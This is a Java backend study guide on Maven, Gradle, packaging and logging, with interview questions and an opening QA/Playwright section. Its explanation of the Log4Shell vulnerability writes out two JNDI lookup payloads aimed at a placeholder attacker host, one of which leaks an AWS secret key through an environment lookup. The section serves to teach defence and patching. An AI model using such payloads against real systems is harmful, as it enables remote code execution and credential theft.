A custom binding attaches a goal to a phase:

<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-failsafe-plugin</artifactId>
  <executions>
    <execution>
      <goals>
        <goal>integration-test</goal>   <!-- bound to integration-test by default -->
        <goal>verify</goal>             <!-- bound to verify by default -->
      </goals>
    </execution>
  </executions>
</plugin>

<pluginManagement> plays the same role for plugins that dependencyManagement does for dependencies: it configures a plugin version and settings, without activating it.

Profiles

A profile is a set of POM changes applied under some condition, such as different dependencies for a database or a build for CI.

<profiles>
  <profile>
    <id>ci</id>
    <activation>
      <property><name>ci</name></property>     <!-- or activeByDefault, jdk, os, file -->
    </activation>
    <properties><skipITs>false</skipITs></properties>
  </profile>
</profiles>

$ mvn verify -Pci
$ mvn help:active-profiles

A Maven profile changes the build; a Spring profile changes the running application. Don't build different artifacts per environment: build once, and supply environment settings at run time. That way, what was tested is exactly what's deployed. Note that activeByDefault turns off as soon as any other profile in that POM is activated.

Repositories

RepositoryLocationPurpose
Local~/.m2/repositoryCache of everything downloaded, plus mvn install output
Centralrepo.maven.apache.orgThe default public repository
Remote or privateNexus, Artifactory, GitHub PackagesCompany artifacts, plus a proxy of Central

Lookup: local first, then the configured remotes. Credentials and mirrors belong in ~/.m2/settings.xml, not in the POM, and never in source control. distributionManagement sets where mvn deploy publishes. A company mirror in settings.xml protects builds against outages and supply-chain surprises. Supply chain risk: use exact versions, keep a private proxy, and scan with OWASP Dependency-Check or a similar tool.

The Maven Wrapper

The wrapper (mvnw, mvnw.cmd, .mvn/wrapper/maven-wrapper.properties) is committed to the repository. It downloads the exact Maven version the project specifies, so every developer and CI runner builds with the same version, with no Maven installed. Create it with mvn wrapper:wrapper, then run ./mvnw verify. Gradle has the same idea with gradlew. Spring Initializr projects include it.

Gradle compared

Gradle builds are programs written in Kotlin or Groovy. Rather than a fixed lifecycle, there's a graph of tasks. Its main strength is speed: it skips tasks whose inputs and outputs are unchanged (incremental build), has a shared build cache, and a daemon that stays warm.

// build.gradle.kts
plugins {
    java
    id("org.springframework.boot") version "4.0.0"
    id("io.spring.dependency-management") version "1.1.7"
}
group = "com.acme"
version = "1.0.0"
java { toolchain { languageVersion = JavaLanguageVersion.of(21) } }
repositories { mavenCentral() }

dependencies {
    implementation("org.springframework.boot:spring-boot-starter-web")
    compileOnly("org.projectlombok:lombok")
    annotationProcessor("org.projectlombok:lombok")
    runtimeOnly("org.postgresql:postgresql")
    testImplementation("org.springframework.boot:spring-boot-starter-test")
}
tasks.test { useJUnitPlatform() }
MavenGradle
Build definitionDeclarative XMLKotlin or Groovy code
ModelFixed lifecycle with phasesGraph of tasks
Conflict resolutionNearest winsHighest version wins
SpeedSlower, with a full rebuild unless tunedFaster through incremental builds and caching
FlexibilityPlugins; custom logic is awkwardVery flexible, and easy to make hard to maintain
UniformityEvery project looks the sameVaries by team
Common inEnterprise JavaAndroid, large multi-module builds, Spring's own projects
Gradle configurationMaven scopeNote
implementationcompile (but not leaked)On consumers' run-time class path only
api (java-library plugin)compileExposed to consumers at compile time too
compileOnlyprovidedCompile only
runtimeOnlyruntimeRun time only
testImplementationtestTests
annotationProcessorCompiler plugin configProcessors have their own path

implementation vs api is the key Gradle question. With implementation, changing a dependency doesn't recompile consumers, which speeds up builds and prevents leaking internals. Useful commands are ./gradlew build, ./gradlew dependencies, ./gradlew dependencyInsight --dependency jackson-core, and ./gradlew bootJar. Gradle can use BOMs with platform(...), and lock versions with dependency locking.

JAR, WAR and fat JAR

TypeContentsRun with
JARClasses, resources, META-INF/MANIFEST.MF. No dependenciesjava -cp app.jar:lib/* com.acme.Main
WARClasses in WEB-INF/classes, libraries in WEB-INF/lib. No serverDeploy to Tomcat or similar
Fat (uber) JAR, shadedAll dependency classes merged into one treejava -jar app.jar
Spring Boot executable JARYour classes in BOOT-INF/classes, dependency JARs nested in BOOT-INF/lib, plus a loaderjava -jar app.jar
EARSeveral modules for a Jakarta EE serverLegacy application servers

Standard Java can't load a JAR inside a JAR. So a Boot JAR's manifest has Main-Class set to Boot's launcher, and Start-Class to your class. The launcher sets up a class loader that reads nested JARs, then calls your main. In Boot 3.2 and later the launcher classes moved to org.springframework.boot.loader.launch, for example JarLauncher.

app.jar
  META-INF/MANIFEST.MF     Main-Class: org.springframework.boot.loader.launch.JarLauncher
                           Start-Class: com.acme.Application
  BOOT-INF/classes/        your code
  BOOT-INF/lib/            dependencies, unmerged
  BOOT-INF/classpath.idx
  BOOT-INF/layers.idx      layers for Docker
  org/springframework/boot/loader/...

A shaded JAR's weakness: files with the same path collide, such as META-INF/services entries, and signed JARs break. Relocation renames packages, resolving conflicts in libraries. Boot avoids this by keeping JARs separate.

For Docker: don't copy one fat JAR into an image, since a one-line change invalidates a large layer. Boot's layered JARs split dependencies from your code so that image layers are shared. java -Djarmode=tools -jar app.jar extract unpacks it (Boot 3.3 and later), which also starts faster and works well with CDS.

Logging: the SLF4J facade

Java has had several logging libraries: Log4j 1, java.util.logging (JUL), Commons Logging, Logback and Log4j 2. If a library picked one directly, every application using it would inherit that choice. SLF4J (Simple Logging Facade for Java) solves that. Code calls a small API, and a logging implementation is chosen at deployment by what's on the class path. It's the Facade pattern, and structurally a Bridge.

public class OrderService {
    private static final Logger log = LoggerFactory.getLogger(OrderService.class);

    public void place(Order o) {
        log.info("Placing order id={} total={}", o.id(), o.total());
        try {
            charge(o);
        } catch (PaymentException e) {
            log.error("Payment failed for order id={}", o.id(), e);   // exception last
            throw e;
        }
    }
}
  • Providers: SLF4J 2 finds an implementation with ServiceLoader. SLF4J 1.7 used a static binder class. If none is found, it warns and uses a no-op logger, so your logs silently disappear. If several are found, it warns and picks one.
  • Bridges: jul-to-slf4j, jcl-over-slf4j and log4j-over-slf4j redirect old APIs to SLF4J. Spring Boot's logging starter sets this up.
  • A trap: never have a bridge and its reverse binding together, such as log4j-over-slf4j with slf4j-reload4j. Calls loop until StackOverflowError.

Parameterized logging

The form with {} placeholders is cheaper than string concatenation, because the message is formatted only if the level is enabled.

log.debug("user=" + user + " cart=" + cart);    // bad: toString runs even if DEBUG is off
log.debug("user={} cart={}", user, cart);       // good: formatted only when enabled

Real behaviour from a run, with these unusual cases:

log.info("{} and {}", "a");                 // a and {}          missing argument stays literal
log.info("x {}", "a", "b");                 // x a               extra argument is ignored
log.error("fail id={}", 42, new RuntimeException("boom"));
                                            // fail id=42, then the full stack trace
log.info("{}", (Object) new int[]{1, 2});   // [1, 2]            arrays print their contents

If the last argument is a Throwable without a placeholder, it's treated as the exception, and its stack trace is logged. Writing log.error("failed: " + e) or log.error("failed: {}", e.getMessage()) loses the stack trace, which is one of the most common logging mistakes.

Parameters are evaluated before the call. If computing one is expensive, guard it, or use the fluent API from SLF4J 2:

if (log.isDebugEnabled()) {
    log.debug("state={}", expensiveDump());
}
log.atDebug().setMessage("state={}").addArgument(() -> expensiveDump()).log();  // lazy
log.atInfo().setMessage("paid").addKeyValue("orderId", id).log();               // structured

Logback and Log4j 2

LogbackLog4j 2
Relation to SLF4JNative implementation, by the same authorOwn API plus log4j-slf4j2-impl adapter
Spring BootThe defaultExclude spring-boot-starter-logging, add spring-boot-starter-log4j2
AsyncAsyncAppender with a blocking queueAsync loggers on the LMAX Disruptor, built for high throughput
AllocationNormalHas a garbage-free mode
Configlogback-spring.xmllog4j2-spring.xml, also YAML, JSON

A logging system has three parts: a Logger receives events, an Appender writes them to a destination (console, file, network), and an Encoder or Layout formats them.

<!-- logback-spring.xml -->
<configuration>
  <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
    <file>logs/app.log</file>
    <rollingPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy">
      <fileNamePattern>logs/app.%d{yyyy-MM-dd}.%i.log.gz</fileNamePattern>
      <maxFileSize>100MB</maxFileSize>
      <maxHistory>14</maxHistory>
      <totalSizeCap>5GB</totalSizeCap>
    </rollingPolicy>
    <encoder>
      <pattern>%d{ISO8601} %-5level [%thread] %logger{36} [%X{requestId}] - %msg%n</pattern>
    </encoder>
  </appender>

  <logger name="com.acme" level="DEBUG"/>
  <root level="INFO"><appender-ref ref="FILE"/></root>
</configuration>

In Spring Boot, simple cases need no XML: logging.level.com.acme=DEBUG, logging.file.name. Name the file logback-spring.xml rather than logback.xml, so that Spring's <springProfile> tag works. Actuator's /actuator/loggers endpoint changes a level at run time, with no restart. It's very useful during an incident, and must be secured. Boot 3.4 added structured logging: logging.structured.format.console=ecs writes JSON.

Levels and logger hierarchy

LevelUse forProduction
ERRORAn operation failed and needs attention. Should be actionableOn, alert
WARNUnexpected but handled: a retry, a fallbackOn
INFOBusiness milestones: started, order placedOn
DEBUGDiagnostic detailsOff, or enabled briefly
TRACEVery detailed flowOff

Log4j 2 also has FATAL, which SLF4J doesn't. Loggers form a tree by dots in the name: com.acme.db is a child of com.acme, and the top is root. A logger with no level inherits the nearest ancestor's. Setting a level to INFO enables INFO and everything more severe.

Additivity: an event also goes to the appenders of all ancestors, by default. This real run shows both behaviours:

<logger name="com.acme" level="WARN"/>
<logger name="com.acme.db" level="DEBUG"><appender-ref ref="C"/></logger>
<root level="INFO"><appender-ref ref="C"/></root>

web.info("w-info");     // nothing: com.acme.web inherits WARN
web.warn("w-warn");     // WARN  com.acme.web - w-warn
db.debug("d-debug");    // DEBUG com.acme.db - d-debug      printed TWICE
                        // DEBUG com.acme.db - d-debug
other.info("o-info");   // INFO  org.x - o-info
other.debug("o-debug"); // nothing: root is INFO

d-debug appears twice because the appender is attached to both com.acme.db and root. It also shows a subtle rule: the level check happens once, at the logger the call was made on. Root's INFO level doesn't filter events passing up from a child. Fix duplicates with additivity="false", or by attaching the appender in only one place.

MDC: request context in every line

With many concurrent requests, log lines interleave, and you can't tell which belong together. Mapped Diagnostic Context is a per-thread map whose values can be included in every log line with %X{key}.

@Component
class RequestIdFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
                                    FilterChain chain) throws ServletException, IOException {
        String id = Optional.ofNullable(req.getHeader("X-Request-Id"))
                            .orElseGet(() -> UUID.randomUUID().toString());
        MDC.put("requestId", id);
        res.setHeader("X-Request-Id", id);
        try {
            chain.doFilter(req, res);
        } finally {
            MDC.remove("requestId");     // pool threads are reused
        }
    }
}

MDC is thread-based, and that leads to the two standard problems. A run with Logback confirmed a new thread doesn't inherit it: the child printed child=null, and its log line had an empty [].

  • Stale values: without the finally, a reused pool thread logs another request's ID.
  • Async work loses context: @Async, CompletableFuture and thread pools run elsewhere. Copy it explicitly:
class MdcTaskDecorator implements TaskDecorator {
    @Override public Runnable decorate(Runnable task) {
        Map<String, String> context = MDC.getCopyOfContextMap();   // on the calling thread
        return () -> {
            if (context != null) MDC.setContextMap(context);       // on the worker
            try { task.run(); } finally { MDC.clear(); }
        };
    }
}
// executor.setTaskDecorator(new MdcTaskDecorator());

Spring Boot's Micrometer Tracing puts traceId and spanId in the MDC for you, and propagates them between services, which is usually better than a home-made filter. In reactive code a request hops between threads, so it needs Reactor's context propagation support instead.

Async appenders

Writing to a disk or network inside a request adds latency, and a slow disk stalls every thread. An async appender puts the event on a queue, and a background thread does the I/O.

<appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
  <queueSize>8192</queueSize>              <!-- default 256 -->
  <discardingThreshold>0</discardingThreshold>  <!-- 0 means never drop by level -->
  <neverBlock>true</neverBlock>            <!-- drop rather than block callers when full -->
  <appender-ref ref="FILE"/>
</appender>
Trade-offDetail
Dropped eventsBy default, Logback's AsyncAppender drops TRACE, DEBUG and INFO once 80% of the queue is used. WARN and ERROR are kept
BlockingWith neverBlock=false, a full queue makes callers wait, so a slow sink still stalls requests
Crash lossEvents in the queue vanish if the JVM dies. Those last lines are often the ones you want
ShutdownNeeds a clean stop to flush. Spring Boot stops the logging system on shutdown; elsewhere, call LoggerContext.stop()
Caller dataClass and line number (%C, %L) are expensive to compute, and are off in async appenders unless includeCallerData is on

In containers, the usual choice is simply writing structured JSON to stdout, and letting the platform ship it (Fluent Bit, Splunk forwarder, ELK). The application then doesn't manage files or rotation.

The Log4Shell lesson

Log4Shell (CVE-2021-44228), disclosed in December 2021, was a remote code execution flaw in Log4j 2, affecting versions from 2.0-beta9 to 2.14.1. It scored the maximum severity of 10.0, and is a textbook case for interviews.

How it worked: Log4j 2 supported message lookups, replacing patterns like ${...} in log messages, including through JNDI (Java Naming and Directory Interface), which can fetch objects from a remote server.

  1. An attacker sends a string such as ${jndi:ldap://evil.example/a} in anything that gets logged: a User-Agent header, a username, a chat message.
  2. The application logs it. Parameterized logging doesn't help, because the lookup runs on the final message.
  3. Log4j sees the pattern and makes an LDAP request to the attacker's server.
  4. The response points to a remote Java class. On older JVMs, that class is downloaded and runs. Newer JVMs restrict remote class loading, but other paths remained, such as leaking environment variables in a lookup: ${jndi:ldap://evil.example/${env:AWS_SECRET_ACCESS_KEY}}.

Fix: upgrade. 2.15.0 was the first fix, but was incomplete, and more CVEs followed, so 2.17.1 and later (on Java 8) is the baseline. Lookups in messages are now removed, and JNDI is off by default. Logback itself wasn't affected by this CVE, and neither were Spring Boot's defaults, unless Log4j 2 had been chosen. Log4j 1 is a separate end-of-life product with its own flaws.

Lessons for design:

  • Logging is an attack surface: it handles untrusted input.
  • Features can be vulnerabilities: a rarely used, on-by-default feature was the hole.
  • Know your transitive dependencies. Most victims didn't know they used Log4j. A Software Bill of Materials (SBOM) and scanning tools answer "are we affected?" in minutes.
  • Be able to patch fast: automated builds, tests and deployment.
  • Limit outbound traffic: a server that can't reach the internet would've blocked the exploit.

Logging best practices

  • Never log secrets: passwords, tokens, card numbers, or personal data, which can also be a legal issue. Mask them. Beware of toString() on whole entities or requests.
  • Log injection: user input with newlines can forge log entries. Structured JSON logging encodes that safely.
  • Log or rethrow, not both. Doing both produces the same stack trace several times. Handle it at the boundary, typically in a @ControllerAdvice.
  • Include identifiers, so that a line is useful alone: orderId=42 beats Order failed.
  • Prefer structured key-value fields over prose, so that logs can be searched.
  • Don't log in hot loops. Logging at high volume is a real cost in CPU, I/O and money.
  • Logger as private static final, or Lombok's @Slf4j. Use the class as the name, so level configuration works by package.

Gradle: Build Phases and Version Catalogs

Every Gradle build runs in three phases:

  1. Initialization: reads settings.gradle(.kts) to decide which projects take part.
  2. Configuration: runs every build script to build the task graph. Code at the top level of a script runs on every build, even gradle help, so expensive work there slows everything. The configuration cache can skip this phase on repeat builds.
  3. Execution: runs only the requested tasks and their dependencies, skipping up-to-date tasks (inputs and outputs unchanged) and reusing outputs from the build cache.

A version catalog (gradle/libs.versions.toml) centralises versions for multi-project builds, similar in spirit to Maven's dependencyManagement, with type-safe accessors:

# gradle/libs.versions.toml
[versions]
mapstruct = "1.6.3"

[libraries]
mapstruct = { module = "org.mapstruct:mapstruct", version.ref = "mapstruct" }
mapstruct-processor = { module = "org.mapstruct:mapstruct-processor", version.ref = "mapstruct" }

// build.gradle.kts
dependencies {
    implementation(libs.mapstruct)
    annotationProcessor(libs.mapstruct.processor)
    implementation(platform("org.springframework.boot:spring-boot-dependencies:3.4.0"))   // BOM
}

Keeping Dependencies Current and Auditable

  • Automated update PRs: Dependabot or Renovate open a PR when a new version appears; CI runs the tests; patch updates can auto-merge. Small, frequent upgrades are far cheaper than a yearly big-bang.
  • Vulnerability scanning: OWASP Dependency-Check, Snyk, GitHub/GitLab dependency scanning, or a registry scanner fail the build on critical CVEs.
  • SBOM: generate a Software Bill of Materials (CycloneDX Maven/Gradle plugin; Spring Boot 3.3+ can include it and expose it via the sbom actuator endpoint) so "are we using library X version Y?" is answerable in minutes.
  • Reports: mvn versions:display-dependency-updates lists newer versions; maven-enforcer-plugin with dependencyConvergence and banDuplicatePomDependencyVersions catches drift.

Structured (JSON) Logging in Spring Boot

Plain text lines are hard to query in ELK, Loki, Splunk or Cloud Logging. JSON logs make every field (level, logger, traceId, MDC keys) searchable. Spring Boot 3.4+ supports it out of the box; earlier versions use logstash-logback-encoder.

# application.yml (Spring Boot 3.4+)
logging:
  structured:
    format:
      console: ecs          # or logstash, gelf
# Typical line:
# {"@timestamp":"2025-03-01T10:15:30.123Z","log.level":"INFO","message":"Order placed",
#  "service.name":"orders","traceId":"4bf92f…","orderId":"981"}

Use JSON in containers (stdout, collected by the platform) and keep human-readable patterns for local development, e.g. via a local profile.

Interview Questions — Maven, Gradle & Logging

What's the difference between a Maven lifecycle, phase, goal and plugin?

A lifecycle is an ordered list of phases (default, clean, site). A phase is a step. A plugin is a package of goals, and a goal is a concrete task. Goals bind to phases. Running mvn package runs all phases up to package, and each runs its bound goals. Running mvn dependency:tree runs one goal, with no lifecycle.

What happens when you run mvn clean install?

Two lifecycles, in order. clean deletes target/. Then the default lifecycle runs up to install: resources are processed, main code is compiled, tests are compiled and run, the JAR is built, integration tests and verification run if configured, and the artifact plus its POM are copied to ~/.m2/repository. It doesn't upload anything; that's deploy.

-DskipTests vs -Dmaven.test.skip=true?

-DskipTests compiles tests but doesn't run them. -Dmaven.test.skip=true doesn't even compile them, and it also skips building test JARs, which can break another module that uses them.

Explain all dependency scopes, with an example of each.

compile: everywhere and transitive (Spring). provided: compile and test, supplied at run time (Servlet API on Tomcat, Lombok). runtime: not needed to compile (a JDBC driver). test: test code only (JUnit). system: deprecated. import: brings in a BOM's dependencyManagement.

Why does a provided Servlet API matter? What happens if it's compile?

Tomcat already provides that API. If your WAR also bundles it in WEB-INF/lib, there can be two copies, leading to ClassCastException or linkage errors. provided makes it available to compile, while keeping it out of the artifact.

How does Maven resolve version conflicts? Which version wins here?

Nearest in the tree wins. On a tie, the first declared wins. So with a direct commons-lang3:3.9, and commons-text:1.10.0 requiring 3.12.0, 3.9 wins, as the direct one is nearer, even though it's older. The run shows omitted for conflict with 3.9. Gradle chose 3.12.0 for the same inputs, since it takes the highest version. In short, Maven's outcome depends on tree shape, and Gradle's on version numbers.

dependencies vs dependencyManagement?

dependencies actually adds to the project. dependencyManagement only records versions and scopes, used if that dependency appears, directly or transitively. So a parent can centralize versions, with children opting in. A common mistake is adding something only to dependencyManagement, and wondering why the class isn't found.

What's a BOM, and how is it different from a parent POM?

A BOM is a POM that lists tested versions in dependencyManagement, consumed with type=pom, scope=import. A project has one parent, but can import many BOMs. A parent also passes on plugins and properties, whereas a BOM only passes versions. Spring Boot, Spring Cloud and Jackson all publish BOMs. Mixing Spring Boot with an incompatible Spring Cloud BOM is a frequent source of errors, so follow the release compatibility table.

How do you find and fix a dependency conflict or NoSuchMethodError?
  1. mvn dependency:tree -Dverbose -Dincludes=groupId:artifactId shows which paths ask for which versions.
  2. Confirm the JAR used at run time with -Xlog:class+load.
  3. Fix with a managed version, or a BOM.
  4. Prevent recurrences with enforcer's dependencyConvergence.

Prefer dependencyManagement over exclusions, which spread and are easy to forget. mvn dependency:analyze also reports used-but-undeclared and declared-but-unused dependencies.

What is a SNAPSHOT version?

A moving development version. In a remote repository, each deploy gets a timestamped build, and consumers check for updates (daily by default, or always with -U). Release versions are immutable. Two builds on the same SNAPSHOT can differ, so releases must not depend on them.

install vs deploy?

install copies the artifact to your machine's local repository, so that other local builds can use it. deploy uploads to a remote repository, for others. In CI, prefer the reactor, using verify, which avoids stale artifacts from ~/.m2, and also avoids problems with parallel jobs.

How do multi-module builds work? What's the reactor?

The parent lists modules. The reactor reads them all, builds a dependency graph, and sorts it. A module that depends on another in the build gets its output directly. Parent inheritance and aggregation are separate concepts. mvn -pl shop-app -am verify builds one module and its upstream modules, which keeps CI fast.

plugins vs pluginManagement?

plugins activates a plugin in this build. pluginManagement only sets default versions and configuration, used if a child declares that plugin. It's the plugin version of dependencyManagement.

Why should the Maven Wrapper be committed?

It pins the Maven version for the project. A new developer or CI agent runs ./mvnw, and the correct version downloads itself. Builds then don't depend on what's installed, and a tool upgrade is reviewed like any code change.

Why is one artifact per environment an anti-pattern?

Building a "prod" and a "test" JAR with Maven profiles means production gets a binary that never ran in test. Build once, and promote the same artifact, with configuration from environment variables, Spring profiles, or Config Server.

How do you keep builds reproducible?

Use the wrapper, pin plugin versions, avoid SNAPSHOT and version ranges, use a JDK toolchain, use a private proxy repository, and set project.build.outputTimestamp for byte-identical output. Gradle offers dependency locking and verification metadata.

Maven vs Gradle: when would you choose each?

Maven: consistency, simple conventions, broad familiarity, and little to customize. Gradle: large or complex builds, where incremental builds and the build cache save real time, or with significant custom logic. The risk with Gradle is that a build becomes a hard-to-maintain program. Avoid saying one is simply better.

implementation vs api in Gradle?

api exposes a dependency to consumers' compile class path. implementation hides it: they only get it at run time. Use implementation by default. It avoids accidental coupling and recompilation, and speeds up builds. Use api when your public method signatures use the library's types. api needs the java-library plugin.

JAR vs WAR vs fat JAR? Why can't plain Java load a Boot JAR's nested JARs?

A JAR contains your classes. A WAR is a web app structure deployed into a server. A fat JAR contains everything. The standard URL class loader can't read a JAR entry inside another JAR as a class path element, so Spring Boot adds its launcher and loader, naming them as Main-Class. Your class is Start-Class. This also means java -cp app.jar com.acme.Application fails, since your class is under BOOT-INF/classes.

Can a Spring Boot app be packaged as a WAR?

Yes. Set <packaging>war</packaging>, mark spring-boot-starter-tomcat as provided, and extend SpringBootServletInitializer, so that the external server starts your app through the Servlet container's initializer mechanism. Boot's WAR can also still run with java -jar. Most new services use an executable JAR, as the runtime is then inside the deployable.

Why build layered images for Spring Boot?

Docker caches per layer. A fat JAR is one layer, so changing one class re-uploads everything. Layers separate dependencies, the loader, snapshots and application code. Your dependencies rarely change, so that layer is reused. mvn spring-boot:build-image uses Buildpacks to do it, or you can extract with -Djarmode=tools in a Dockerfile.

Why use SLF4J rather than Logback directly?

Code stays independent of the implementation, so the deployer picks one. It matters most for libraries: if a library forced a logger, every application would inherit it. In an application it's also standard practice. Spring itself logs through Commons Logging, which Spring Boot routes to the configured system.

Why is log.debug("x={}", x) better than log.debug("x=" + x)?

The concatenation runs regardless of the level, calling toString() and allocating. The parameterized form does the check first, and formats only when enabled. But arguments are still evaluated: log.debug("{}", heavy()) still calls heavy(). For that, use isDebugEnabled(), or a lambda with the fluent API.

Output: what do these lines log?
log.info("{} and {}", "a");
log.info("x {}", "a", "b");
log.error("fail id={}", 42, new RuntimeException("boom"));

In the run: a and {}, then x a, then fail id=42 with a full stack trace. No exception is thrown for a mismatch, and the unfilled placeholder stays. The final Throwable isn't consumed by a placeholder, so it's logged as the exception.

How do you log an exception properly?

log.error("Payment failed orderId={}", id, e): a message with context, and the exception as the last argument. Avoid e.printStackTrace(), which bypasses logging. Avoid log.error(e.getMessage()), which loses the stack trace, and the message may be null. If you rethrow, wrap it with context and let the top level log it.

Output: why does each log line appear twice?

Additivity. An event goes to the logger's own appenders and then to its ancestors' appenders. An appender attached to both com.acme.db and root prints it twice, as the run above showed for d-debug. Set additivity="false" on the child, or attach the appender in just one place. A second cause is two configuration files, or a framework attaching a default appender.

What is MDC, and what goes wrong in thread pools and async code?

MDC is a per-thread key-value map, added to log lines through the pattern. In a pool, a value not removed leaks into the next request on that thread, so always clear it in finally. Work on another thread doesn't get the values: a new thread had null in the run. Use a TaskDecorator to copy the map, or Micrometer's context propagation.

How would you trace one request across microservices in the logs?

Assign a trace ID at the edge, pass it on in headers (the W3C traceparent), and write it to every log line through MDC. Micrometer Tracing with Spring Boot does this, and also across RestClient and Kafka when using instrumented clients. Logs are sent to a central store, like Splunk or ELK, and you search by trace ID. Distributed tracing tools such as Zipkin or Tempo show the timing.

Sync vs async logging: what are the trade-offs?

Sync is simple, and no logs are lost, but slow I/O adds latency to requests. Async removes that, in exchange for possibly losing the queue on a crash, and either dropping or blocking when full. Logback's default drops below WARN at 80% full. Log4j 2's async loggers have higher throughput. A sensible rule is to keep audit logs synchronous or sent through a durable system. Measure whether logging is really your bottleneck before changing it.

How can you change a log level in production without a restart?

Spring Boot Actuator: POST /actuator/loggers/com.acme.db with {"configuredLevel":"DEBUG"}. Secure this endpoint. It applies to one instance only, so a fleet needs a broadcast approach. Logback can also watch its config file with scan="true". Revert it afterwards, as DEBUG volume can be expensive.

Explain Log4Shell. Why didn't parameterized logging protect you?

Log4j 2 processed ${...} lookups in the formatted message, including JNDI lookups that could contact an attacker's server, and load code or leak secrets. Input is substituted into the message first, and then the lookup is processed, so log.info("user {}", input) was just as vulnerable. Any logged, attacker-controlled string was enough. The fix is upgrading, with 2.15.0 only a first step. It's a lesson about untrusted input, risky defaults, knowing transitive dependencies, and egress control.

Your scanner flags a critical CVE in a transitive dependency. What do you do?
  1. Check that it's reachable: which module, which path. Use mvn dependency:tree.
  2. Upgrade the parent library or BOM if possible.
  3. Otherwise override in dependencyManagement, run the full tests, and document why.
  4. If no fix exists: mitigate, such as by disabling the feature or using a WAF rule.
  5. Add scanning to CI, so that the next one is caught early.
Scenario: The build works locally but fails in CI. Where do you look?

Compare JDK and Maven versions, so use the wrapper and a toolchain. Check for artifacts only in your ~/.m2, from a local install. Check settings.xml and repository credentials, tests that depend on time zone, locale or file paths, case-sensitive file names on Linux, and test order. Run the same container image locally to reproduce it. mvn -X shows detailed logs.

Scenario: The app logs nothing after you add a new library. What happened?

Suspect a logging class path conflict. Look at startup output for SLF4J warnings, such as No SLF4J providers were found or multiple providers. A library may have brought in another binding or an old slf4j-api; for example, a 1.7 binding with a 2.x API is ignored. Run mvn dependency:tree -Dincludes=org.slf4j,ch.qos.logback. Exclude the extra one. Also check that a new logback.xml from a library JAR hasn't replaced yours.

Scenario: Latency spikes appear when the disk is slow, and thread dumps show threads blocked in the logging code. How do you fix this?

Threads are contending on the appender's lock, with slow I/O held inside. Immediate relief: reduce log volume, and switch off DEBUG. Then use an async appender with a sensible queue and neverBlock, or write to stdout and let an agent handle it. Check for caller data patterns, and for logging in hot paths. Confirm with a JFR lock profile.

Why is a Gradle build slow even when you run a trivial task?

The configuration phase runs every build script for every included project before any task executes. Expensive code at configuration time (network calls, reading files, eager task creation with tasks.create instead of tasks.register) slows every invocation. Fix: lazy task registration and providers, enable the configuration cache and build cache, keep the Gradle daemon, and inspect a build scan (--scan) or --profile to find the slow part.

How do you keep a project's dependencies secure and up to date over time?

Manage versions centrally (Spring Boot BOM, dependencyManagement or a Gradle version catalog), let Dependabot/Renovate raise update PRs that CI verifies, scan for CVEs in the pipeline and fail on critical ones, generate an SBOM per release, and upgrade frequently in small steps. For a vulnerable transitive dependency, override its version in dependencyManagement (or a Gradle constraint) until the direct dependency releases a fix.

How do you make sure passwords, tokens or patient data never reach the logs?
  • Don't log whole request bodies or entities; log ids. Override toString() on sensitive DTOs (records print every field by default) or exclude fields (Lombok @ToString.Exclude).
  • Wrap secrets in a type whose toString() returns "***".
  • Add a masking layer as a safety net: a Logback converter/MaskingJsonGeneratorDecorator or Log4j2 rewrite policy with regexes for tokens, card numbers and emails.
  • Disable request/response body logging in HTTP client and gateway debug logs in production.
  • Treat logs as sensitive data anyway: restricted access and retention limits, which matters for HIPAA/GDPR-style compliance.
Why prefer JSON logs in production, and what fields should every line have?

Log platforms can filter and aggregate on fields instead of parsing text with fragile regexes, and multi-line stack traces stay in one event. Every line should carry: timestamp in UTC, level, logger, message, service name and version/environment, traceId/spanId for correlation, and relevant MDC keys (user or tenant id, request id). Keep the message itself human-readable and put variable data in fields.

Manual Testing, Playwright & Postman QA

Quality is a whole-team job: know the testing levels and types, design test cases systematically, report defects clearly, and automate the right layers with Playwright for the UI and Postman/Newman for APIs.

// tests/login.spec.ts  (Playwright Test, TypeScript)
import { test, expect } from '@playwright/test';

test.describe('Login', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/login');              // baseURL comes from playwright.config.ts
  });

  test('valid user lands on dashboard', async ({ page }) => {
    await page.getByLabel('Email').fill('qa.user@example.com');
    await page.getByLabel('Password').fill(process.env.QA_PASSWORD ?? '');
    await page.getByRole('button', { name: 'Sign in' }).click();

    // web-first assertions auto-retry until timeout
    await expect(page).toHaveURL(/\/dashboard/);
    await expect(page.getByRole('heading', { name: 'Dashboard' })).toBeVisible();
  });

  test('wrong password shows an error', async ({ page }) => {
    await page.getByLabel('Email').fill('qa.user@example.com');
    await page.getByLabel('Password').fill('wrong');
    await page.getByRole('button', { name: 'Sign in' }).click();
    await expect(page.getByRole('alert')).toHaveText('Invalid credentials');
    await page.screenshot({ path: 'test-results/login-error.png' });
  });
});

// run:  npx playwright test            (headless by default)
//       npx playwright test --headed --project=chromium
//       npx playwright show-report

Testing Levels and Types

Levels describe what scope is tested:

  • Unit — a single class or function in isolation (JUnit 5 + Mockito, Jasmine/Jest). Fast, written by developers.
  • Integration — components working together: service + repository + real DB (Testcontainers), or @SpringBootTest with MockMvc.
  • System — the full deployed application tested end to end against requirements, functional and non-functional.
  • Acceptance (UAT) — business users or the Product Owner confirm the system meets their needs before release.

Types describe why you test: functional (does feature X behave per spec), regression (did a change break existing behaviour), smoke (broad, shallow check that the build is stable enough to test — "does it start, can I log in"), sanity (narrow, focused check that a specific fix or change works), UAT, and exploratory (simultaneous learning, design and execution, often time-boxed with a charter). Non-functional types include performance, load, security, usability and accessibility.

Test Case Design Techniques

  • Equivalence partitioning — split inputs into classes the system should treat the same; test one value per class. Age field accepting 18–60: partitions are <18, 18–60, >60, plus invalid (empty, non-numeric).
  • Boundary value analysis — bugs cluster at edges, so test on and around each boundary: 17, 18, 19 and 59, 60, 61.
  • Decision tables — for business rules with combined conditions (e.g. discount depends on member? and order > 1000?), list every condition combination and its expected action so no rule is missed.
  • State transition — model states and events (order: Created → Paid → Shipped → Delivered / Cancelled) and test valid and invalid transitions.
  • Error guessing — experience-driven: nulls, special characters, very long strings, double submits, timezone edges.

Writing Test Cases and Bug Reports

A good test case has: ID, title, preconditions, test data, numbered steps, expected result, and (after execution) actual result and status. Each case should test one thing and be repeatable by anyone.

